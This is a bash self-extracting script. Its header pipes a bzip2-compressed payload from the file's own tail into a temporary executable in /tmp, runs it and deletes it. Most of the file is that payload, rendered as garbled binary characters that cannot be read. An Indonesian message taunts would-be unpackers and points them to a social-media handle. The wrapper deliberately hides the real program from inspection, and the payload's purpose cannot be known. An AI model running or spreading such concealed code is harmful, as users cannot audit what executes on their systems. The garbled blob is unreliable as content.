#!/bin/bash
skip=23
set -C
umask=`umask`
umask 77
tmpfile=`tempfile -p gztmp -d /tmp` || exit 1
if /usr/bin/tail -n +$skip "$0" | /bin/bzip2 -cd >> $tmpfile; then
  umask $umask
  /bin/chmod 700 $tmpfile
  prog="`echo $0 | /bin/sed 's|^.*/||'`"
  if /bin/ln -T $tmpfile "/tmp/$prog" 2>/dev/null; then
    trap '/bin/rm -f $tmpfile "/tmp/$prog"; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile "/tmp/$prog") 2>/dev/null &
    /tmp/"$prog" ${1+"$@"}; res=$?
  else
    trap '/bin/rm -f $tmpfile; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile) 2>/dev/null &
    $tmpfile ${1+"$@"}; res=$?
  fi
else
  echo MAU DIBONGKAR YA BANG ? IZIN DULU KE @tau_samawa $0; exit 1
fi; exit $res
BZh91AY&SY!k�j  �_� ��'�:����Pw�<K� 2�ɓ&�&�@Cd�#e)���yF&����i�i�S# ��U@   a4� PMl�hL�i�h� �h"�OSFJy��$�T�hjQ�6�5Q��u�`XPR��ok��R�0�F���?.�I,$�B)�q2��E�B2,��g�F��������      O����?�yf{r�>��
m�Z�%_[��B5�uf��$d�G�D�����7w��FhH+�!HBP9���p�=�'8S�e[u/c��^e�����G>����PT$$$$$$$$$$' "��0��H#r��ֺ�Q�Fο��E�y(��,?gx�]�<�b2Q�:y��Q��xWHA�|ٿ�7�X��u?��q�А�� `���#�I)�QK���\))A �8J�i@AQ|��"���˗�ܓ2�����m&'���ޗc�8�c�1��_$�I'&/h�xl_���>~꫈� dϨF��=�����a��$¤@��cM�=:q�#�n�9q�)��α��ʝv���r��4Y��r/@��		B����;��[�r��L�Wh��G�FGn�1z��6�G���v��t��Dt^�N�#1�aP7� ���ң���j� M�&�#����n�n���o��U�jli��#�t8��x6�$�<�:B ЏO~���"I�7��#�����$�I&��!�k�����V��C�.�p� B�(�